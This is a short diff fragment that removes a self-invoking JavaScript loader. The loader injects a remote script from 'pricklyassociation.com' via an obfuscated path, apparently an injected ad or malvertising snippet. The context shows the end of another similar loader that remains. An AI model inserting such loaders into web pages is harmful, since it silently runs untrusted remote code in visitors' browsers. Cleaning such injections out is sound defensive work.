@@ -249,13 +249,3 @@ s.async = true;
 s.referrerPolicy = 'no-referrer-when-downgrade';
 l.parentNode.insertBefore(s, l);
 })({})
-(function(ksfcijz){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = ksfcijz || {};
-s.src = "\/\/pricklyassociation.com\/b.XQV_sTd\/GhlJ0\/Y-WJcA\/zeIm\/9muAZzUUlYk\/PBTEcPw\/NijpETyaNLz\/cStnN\/zUA\/2JMxTGIQ4QMpQv";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
